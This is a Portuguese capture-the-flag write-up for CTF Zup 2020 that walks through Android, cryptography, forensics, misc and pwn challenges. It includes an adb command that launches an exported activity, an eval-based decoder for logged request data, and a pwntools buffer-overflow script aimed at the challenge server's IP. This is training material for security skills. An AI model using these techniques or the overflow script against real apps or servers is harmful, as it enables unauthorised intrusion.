# :triangular_flag_on_post: CTF Zup 2020  Write up 1#


Este documento contém todas as respostas (passo a passo) e ferramentas utilizadas para resolução 
dos desafios do CTF Zup 2020, ou pelo menos aqueles que eu consegui resolver :rofl:

### Categorias
1. [Android](#debug-me)
    - [Debug](#debug-me)
    - [Decode](#decode)
    - [Db leak](#db-leak)
    - [Export](#exported)
    - [File access](#file-access)
    - [Dynamic Instrumentation](#dynamic-instrumentation)
    - [Intercept](#intercept)
    - [Resources](#resources)
    - [Shared preferences](#shared-preferences)
    - [Smali Inject](#smali)
    - [Strings](#strings)
2. [Criptografia](criptografia/index)
    - [Not a caesar algorithm](#not-a-caesar-algorithm)
3. [Forense](forense/index)
    - [Pdf crypt](#pdf-crypt)
    - [A lost pendrive](#lost-pendrive)
    - [Unk](#unk)
4. [Misc](misc/index)
    - [Log Access](#log-access)
    - [Rotate](#rotate)
5. [Pwns](pown/index)
    - [Pwn1](#pwn1)
    - Pwn2
    - Pwn3
    - Pwn4
6. [Aplicações Web](web/index)
    - Awesome cats
    - Login bypass
    - Easy one
    - Easy two
    - Fucking
    - I hate flask
    - LFI
    - Look Closer
    - Nice site
    - Perl
    - Potatoe is good
    - Server status (SSRF)
    - Unsafe Entity (XXE)

## Android :iphone: ##

### Debug me
O desafio debug pede para que seja exibida uma flag que foi logada pela aplicação, e portanto foi necessário apenas executar o APK em uma máquina virtual e atrelar o dispositivo/apk ao logcat no [Android Studio](#android-studio), vendo o filtro marcado com debug e acionar o botao para "debug" na activity do desafio, dentro do app.
![Android Studio Log](https://github.com/leoplana/ctf-zup-2020/blob/master/android/debug-me.png)


### Decode
O desafio decode indica que o APK deve ser decompilado pois a flag foi compilada junto ao código. Para decompilar o APK de maneira mais fácil possível utilizei uma ferramenta online chamada [APK Decompilers](#apk-decompilers) e então bastou abrir o arquivo Decode.java e lá estava a nossa flag, dividida em três trechos de base64, que juntos formam o valor WlVQLXtoMHU1MyAwZiBjNHJkNX0= ou ZUP-{h0u53 0f c4rd5}
![Decode.java](https://github.com/leoplana/ctf-zup-2020/blob/master/android/decode.png)

### Db Leak
O desafio db leak indica que há uma chave escondida dentro do banco de dados do APP. Estando o app rodando numa VM em execução no [Android Studio](#android-studio), basta abrir a View "Device File Explorer" e acessar a pasta data/data/com.revo.evabs/databases e copiar o arquivo mainframe_access. Ao abrir este arquivo com a ferramenta [SQLite Browser](#sqlite-browser) foi possivel visualizar a chave, dentro do aba de dados
![DB Leak](https://github.com/leoplana/ctf-zup-2020/blob/master/android/db-leak.PNG)

### Exported
Com o APK já decompilado, no desafio exported foi citado que havia uma activity escondida dentro do APP, que estava vulnerável por ser marcada como "exported". Dentro do Manifest.xml portanto foi possível ver o nome dessa activity, que era

```xml
<activity android:exported="true" android:name="com.revo.evabs.ExportedActivity"/>
```
Com o app em execução e fazendo uso da ferramenta [ADB/SDK Platform Tools](#adb) foi possível mandar executar esta activity com uma linha de comando

```shell
adb shell am start -n com.revo.evabs/com.revo.evabs.ExportedActivity
```
![Starting activity](https://github.com/leoplana/ctf-zup-2020/blob/master/android/export.png)

### File access
Para concluir este desafio basta renomear a APK para .zip e acessar a pasta de assets, dentro desta está o arquivo secret que pode ser aberto com o notepad para encontrar a nossa flag.
![Assets in renamed apk](https://github.com/leoplana/ctf-zup-2020/blob/master/android/assets.png)

### Dynamic instrumentation
Este desafio certamente trata de algum conceito do Android e/ou Mobile em geral. Mas será que seria mesmo necessário conhecê-lo para ter acesso à nossa flag?
Com o APK já decompilado, procurei pela Activity do desafio e a encontrei em com.revo.evabs.Frida1.java e vi o trecho relevante para a nossa busca

```Java
public class Frida1 extends AppCompatActivity implements OnClickListener {
    int a = 25;
    int b = 2;
    int x;
    public native String stringFromJNI();
    ...
    if (this.x > rand) {
        tv.setText("VIBRAN IS RESDY TO FLY! YOU ARE GOING HOME!");
        Log.d("CONGRATZ!", stringFromJNI());
        return;
    }
    ...
    static {
        System.loadLibrary("native-lib");
    }
}
```

E então descubro que a flag vem do método stringFromJNI() e que bastaria executá-lo para ter acesso a flag, mas o que é ele? 
Ao estudar um pouco sobre, descubro que o código que implementa stringFromJNI na verdade está contido no arquivo \lib\x86\libnative-lib.so mas ao abrí-lo não é possível ler nada. Isso significa que não temos acesso ao código, certo? 
Bem, na verdade os métodos definidos podem ser acessados desde que a classe que esteja invocando tenha o mesmo nome e estrutura de pacote (JNI) definido na lib.
Criei então um projeto hello world simples no [Android Studio](#android-studio) e transformei a minha "HelloWorldActivity.java" em "Frida1.java", adicionando também a nossa native-libs.so nesse projeto e definindo o mesmo método nativo stringFromJNI(), basta rodar e ver a flag sendo printada no logcat!

![Who needs instrumenwhatever](https://github.com/leoplana/ctf-zup-2020/blob/master/android/instrumentation.png)

### Smali
A Activity deste desafio nos diz que uma variável precisa ser atualizada e o app recompilado, para que a flag seja exibida. Ao acessar sua Activity, novamente vejo que a flag está, na realidade, também no arquivo native-libs.so

```Java
public class SmaliInject extends AppCompatActivity {
    String SIGNAL = "LAB_OFF";
    public native String stringFromSmali();
    ...
    public void onCreate(Bundle savedInstanceState) {
        ...
            String ctrl = SmaliInject.this.stringFromSmali();
            if (SmaliInject.this.SIGNAL.equals("LAB_ON")) {
                StringBuilder sb = new StringBuilder();
                sb.append("ZUP-{");
                sb.append(ctrl);
                sb.append("}");
                textView.setText(sb.toString());
            }
        ...
    }
    static {
        System.loadLibrary("native-lib");
    }
}
```
Aproveitando a solução feita no desafio [Dynamic Instrumentation](#dynamic-instrumentation), renomeei a "HelloWorldActivity.java" para "SmaliInject.java"
e defini o mesmo método nativo stringFromSmali(), rodei e vi a flag sendo printada no logcat, novamente!

![Who needs to recompile](https://github.com/leoplana/ctf-zup-2020/blob/master/android/smali.png)


### Intercept
O desafio intercept cita que há um request sendo feito toda vez que acionamos um determinado botão do app. Estando com o APP rodando em VM, no ambiente do [Android Studio](#android-studio) basta abrir a View 'Profiler' da IDE e criar uma sessão atrelada ao dispositivo virtual (vm) e ao processo (nosso apk). Esse recurso começa então a monitorar tanto os pacotes enviados quanto cpu, energia e memória do aparelho (vm). Logo ao acionar o botão para executar o request este pode ser visto em detalhes na IDE.
![Request interception](https://github.com/leoplana/ctf-zup-2020/blob/master/android/request-interception.png)

### Resources
O desafio resources, similar ao file access, também só precisa do apk renomeado para a extensão zip. Dessa forma basta acessar o diretório res/raw e lá está a flag.
![Resources](https://github.com/leoplana/ctf-zup-2020/blob/master/android/resources.png)

### Shared preferences
Para o desafio shared preferences ser resolvido, precisei do APP rodando em VM, no ambiente do [Android Studio](#android-studio) e então bastou abrir a View 'Device File Explorer' e acessar o arquivo data/data/com.revo.evabs/shared_prefs/DETAILS.xml (ele só é criado após a execução do app pelo menos uma vez e atribuição do nome na primeira tela)
![Shared preferences is not safe](https://github.com/leoplana/ctf-zup-2020/blob/master/android/shared-preferences.png)

### Strings
Com o APK já decompilado, após fazer uso da ferramenta [APK Decompilers](#apk-decompilers) bastou abrir o arquivo disponível em res\values\strings.xml
![Strings.xml](https://github.com/leoplana/ctf-zup-2020/blob/master/android/strings.png)

## Criptografia :key:

### Not a caesar algorithm ##
Esse desafio nos dá uma flag aparentemente criptografada e a única dica é que não se trata de um algoritmo de cifra de césar. Fazendo uso da ferramenta online [Dcode.fr](#dcode) e testando alguns algoritmos através de força bruta, em pouco tempo foi possível descobrir que se tratava do algoritmo Affine.
![dCode rules](https://github.com/leoplana/ctf-zup-2020/blob/master/crypt/affine.png)

## Forense :mag:

### Pdf crypt ###
Este desafio se trata de um arquivo pdf criptografado e com senha para acesso. Para acessá-lo foi tão simples quanto fazer uso da ferramenta online [IlovePDF](#ilovepdf)
![Are encrypted pdf safe? I'm not sure anymore](https://github.com/leoplana/ctf-zup-2020/blob/master/forensics/pdf.png)

### Lost pendrive ###
Este desafio disponibliza um arquivo zip de aprox 25MB e fala que é proveniente de um pendrive achado na rua... Ao abrir o arquivo no winrar é possível ver que o conteúdo é um arquivo sem extensão alguma, e com quase 4GB de tamanho *(?)*. Após achar bastante suspeito abro este arquivo com o editor Hexadecimal [HxD](#hxd) e vejo vários trechos nulos
![Lost pendrive looks bigger than it is](https://github.com/leoplana/ctf-zup-2020/blob/master/forensics/hex-lost-pendrive.png)
Apago esses valores nulos (00) apenas para tornar o arquivo de mais fácil manipulação, com isso o seu tamanho real cai bastante (26mb pelo menos). Ainda no editor hexadecimal percebo alguns indícios de que esse arquivo é uma imagem, pois dentro dele existem vários arquivos e pastas. O renomeio para .bin e faço uso da ferramenta [OSF Mount](#osf-mount) para montar a imagem como uma unidade de disco, e lá dentro achamos nossa flag, dentro do rar passwords.txt.zip
![Lost pendrive looks bigger than it is](https://github.com/leoplana/ctf-zup-2020/blob/master/forensics/mount-lost-pendrive.png)

### Unk ###
Esse desafio é um arquivo sem extensão alguma. Ao abrí-lo com o editor hexadecimal [HxD](#hxd) é possível ver algumas estruturas de um arquivo docx, arquivos xml comuns a esse tipo de arquivo. Bastou então renomear o arquivo para unk.docx e abrí-lo no Microsoft Word. O Word irá alertar que o arquivo contém informações ilegíveis e possibilita recuperar o documento automaticamente, e ele mesmo consegue fazer o trabalho.
O nosso unk na verdade era mesmo um docx!
![Unk file nice song](https://github.com/leoplana/ctf-zup-2020/blob/master/forensics/unk.png)

## Misc :earth_americas:

### Log Access ###
Este desafio disponibliza um arquivo zip contendo um arquivo de texto com extensão .ctf. Ao abrir o arquivo na ferramenta [Notepad++](#notepad++) e analisar "no olho" (é um arquivo pequeno) na linha 110 do arquivo há o log de um request contendo um parâmetro bem extenso. Após analisar cheguei na função javascript abaixo

```Javascript
var revealLogAccess = (x) => eval(decodeURIComponent(x).replace(/(.*)(String\.fromCharCode\(.*\))(.*)/,"$2"))
```
que recebendo a url completa da linha 110 como parâmetro nos retorna a tão desejada flag 
![Log access flag](https://github.com/leoplana/ctf-zup-2020/blob/master/misc/log-access.png)


### Rotate ###
Este desafio nos dá um texto cifrado, e também a dica de que ele foi rotacionado n e após y vezes. Bastou então fazer uso da ferramenta [dCode](#dCode) utilizando o recurso ROT Cipher(#https://www.dcode.fr/rot-cipher) e aplicando o número de rotações indicado no desafio para obter a flag final! 

## Pwns :computer:

### Pwn1 ###
Este desafio nos dá um arquivo sem extensão alguma, e também uma instrução shell
```shell
nc 18.228.166.40 4321
```
Se trata de um comando da ferramenta [netcat](#netcat), ao executar é possível ver um diálogo. O mesmo diálogo está dentro do arquivo disponibilizado, logo a conclusão é
que este arquivo é um executável e que o servidor indicado está rodando este mesmo arquivo. Agora como descobrir o funcionamento dele?
A ferramenta utilizada foi a [OnlineDisassembler](#online-disassembler) para abrir esse arquivo, e então temos que na imagem abaixo é possível ver a condicional necessária
para a execução da função 'print_flag' que provavelmente é a nossa função desejada.
![Log access flag](https://github.com/leoplana/ctf-zup-2020/blob/master/pwn/pwn1-step1.png)
Para fazer essa condicional ser atingida (o valor informado à esquerda também ser atribuído o hexa 0xDEA110C8 precisamos causar um buffer overflow)

O código em Python abaixo foi executado utilizando o [Python3](#python3) em um ambiente linux no [docker](#docker) e realiza exatamente esse trabalho, 
fazendo uso também da lib [pwntools](#pwntools)

```python
from pwn import *
context.log_level = 'debug'
p = remote('18.228.166.40',4321)
flag = "\xc8\x10\xa1\xde"

log.info(p.recvuntil('What... is your name?'))
p.sendline(str('Sir Lancelot of Camelot'))
log.info(p.recvuntil('What... is your quest?'))
p.sendline('To seek the Holy Grail.')
sleep(1)
log.info(p.recvuntil('What... is my secret?'))

p.sendline("A" * 43 + flag)
p.interactive()
```


## Aplicações Web :globe_with_meridians:



# Ferramentas #

### Android Studio ###
IDE para desenvolvimento Android disponível neste [link](https://redirector.gvt1.com/edgedl/android/studio/install/4.1.0.19/android-studio-ide-201.6858069-windows.exe) 
### APK Decompilers ###
Ferramenta online para decompilar apks disponível [em](https://www.apkdecompilers.com/)
### SQLite Browser ###
Ferramenta para visualizar arquivos SQLite disponível [em](https://download.sqlitebrowser.org/DB.Browser.for.SQLite-3.12.0-win64.msi)
### ADB ###
Ferramenta cli para interagir/conectar com dispositivos Android via CMD disponível [em](https://dl.google.com/android/repository/platform-tools_r30.0.4-windows.zip)
### dCode ###
Ferramenta online para decriptografia com vários algoritmos disponíveis bem como força bruta, disponível [em](https://www.dcode.fr/)
### ILOVEPDF ###
Ferramenta online que permite abrir pdfs criptografados, disponível no [link](#https://www.ilovepdf.com/unlock_pdf)
### HXD ###
Ferramenta de editor Hexadecimal disponível [em](#https://mh-nexus.de/downloads/HxDSetup.zip)
### OSF Mount ###
Ferramenta para montar imagem bin em um diso virtual, disponível [em](#https://www.osforensics.com/downloads/osfmount.exe)
### Notepad++ ###
Editor de texto preferido de alguns devs, disponível [em](#https://notepad-plus-plus.org/downloads/)
### Netcat ###
Ferramenta de rede para conexões TCP/UDP, instalada em ambiente linux através do comando
```shell
apt install netcat
```
### Online Disassembler ###
Ferramenta online para visualizar as instruções de um arquivo ELF compilado disponível [em](#https://onlinedisassembler.com/odaweb/)
### Python3 ###
Versão do python utilizada instalada em ambiente linux através do comando abaixo
```shell
apt-get install python3
apt-get install python3-pip
```
### Pwntools ###
Framework python voltado para CTF's disponível [em](#https://github.com/Gallopsled/pwntools)
### Docker ###
Ferramenta de container que dispensa comentários disponível [em](#https://desktop.docker.com/win/stable/Docker%20Desktop%20Installer.exe)
